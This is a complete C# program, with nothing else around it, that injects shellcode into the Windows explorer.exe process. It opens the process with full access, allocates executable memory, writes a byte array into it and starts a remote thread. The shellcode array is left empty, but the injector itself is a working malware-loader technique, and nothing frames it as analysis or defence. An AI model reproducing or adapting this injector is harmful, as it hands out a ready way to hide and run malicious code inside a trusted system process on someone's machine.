using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Inj {
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(int f, bool b, int pid);
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint f, uint p);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
    [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr t, uint s, IntPtr st, IntPtr p, uint c, IntPtr id);

    static void Main(string[] args) {
        var pid = Process.GetProcessesByName("explorer")[0].Id;
        var h = OpenProcess(0x001F0FFF, false, pid);
        byte[] sc = new byte[] {};
        var addr = VirtualAllocEx(h, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        WriteProcessMemory(h, addr, sc, (uint)sc.Length, out _);
        CreateRemoteThread(h, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
